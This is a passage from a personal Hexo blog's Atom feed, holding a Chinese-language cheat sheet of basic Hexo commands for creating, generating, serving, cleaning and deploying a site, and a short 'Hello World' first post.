title="new"></a>new</h2><blockquote><p>$ hexo new [layout] <title></title></p></blockquote><p>新建一篇文章。如果没有设置 layout 的话，默认使用 _config.yml 中的 default_layout 参数代替。如果标题包含空格的话，请使用引号括起来。</p><h2 id="generate"><a href="#generate" class="headerlink" title="generate"></a>generate</h2><blockquote><p>$ hexo generate</p></blockquote><p>生成静态文件,等价于<strong>hexo g</strong></p><h2 id="server"><a href="#server" class="headerlink" title="server"></a>server</h2><blockquote><p>$ hexo server</p></blockquote><p>启动服务器等价于<strong>hexo s</strong>。默认情况下，访问网址为： <a href="http://localhost:4000/。" target="_blank" rel="noopener">http://localhost:4000/。</a></p><h2 id="clean"><a href="#clean" class="headerlink" title="clean"></a>clean</h2><blockquote><p>$ hexo clean</p></blockquote><ul><li>清除缓存文件 (db.json) 和已生成的静态文件 (public)。</li><li>在某些情况（尤其是更换主题后），如果发现您对站点的更改无论如何也不生效，您可能需要运行该命令。</li></ul><h2 id="deploy"><a href="#deploy" class="headerlink" title="deploy"></a>deploy</h2><blockquote><p>hexo deploy</p></blockquote><p>部署网站。等价于<strong>hexo d</strong></p><ul><li>ps:用这个命令要先安装扩展<blockquote><p>npm install hexo-deployer-git –save</p></blockquote></li></ul><h1 id="部署到网站的一般流程"><a href="#部署到网站的一般流程" class="headerlink" title="部署到网站的一般流程"></a>部署到网站的一般流程</h1><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">hexo clean</span></span><br><span class="line"><span class="attribute">hexo g</span></span><br><span class="line"><span class="attribute">hexo d</span></span><br></pre></td></tr></table></figure><p>不过此前一般在本地测试<br><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">hexo g</span></span><br><span class="line"><span class="attribute">hexo s</span></span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;为什么搭博客？&quot;&gt;&lt;a href=&quot;#为什么搭博客？&quot; class=&quot;headerlink&quot; title=&quot;为什么搭博客？&quot;&gt;&lt;/a&gt;为什么搭博客？&lt;/h1&gt;&lt;p&gt;&lt;del&gt;还不是因为无聊，学习是不可能的，这辈子都不可能学习；打LOL又嫌舍友太菜。&lt;/del&gt;&lt;br&gt;开个玩笑，搭建自己的博客主要还是因为记录下自己的学习成长过程嘛，队里的大佬都有自己的Blog，自己也不好意思落下，有空的上传下自己的做题的writeup或复现还是不错的。&lt;br&gt;
    
    </summary>
    
      <category term="教程" scheme="https://cy9nusg4rd3n.github.io/categories/%E6%95%99%E7%A8%8B/"/>
    
    
      <category term="教程" scheme="https://cy9nusg4rd3n.github.io/tags/%E6%95%99%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>MyFirst</title>
    <link href="https://cy9nusg4rd3n.github.io/2018/11/07/MyFirst/"/>
    <id>https://cy9nusg4rd3n.github.io/2018/11/07/MyFirst/</id>
    <published>2018-11-07T14:39:01.000Z</published>
    <updated>2020-04-18T03:13:04.587Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="第一篇博客"><a href="#第一篇博客" class="headerlink" title="第一篇博客"></a>第一篇博客</h1><blockquote><p>Hello World！</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="心情" scheme="https://cy9nusg4rd3n.github.io/categories/%E5%BF%83%E6%83%85/"/>
    
    
      <category term="心情" scheme="https://cy9nusg4rd3n.github.io/tags/%E5%BF%83%E6%83%85/"/>
    
  </entry>
  
</feed>
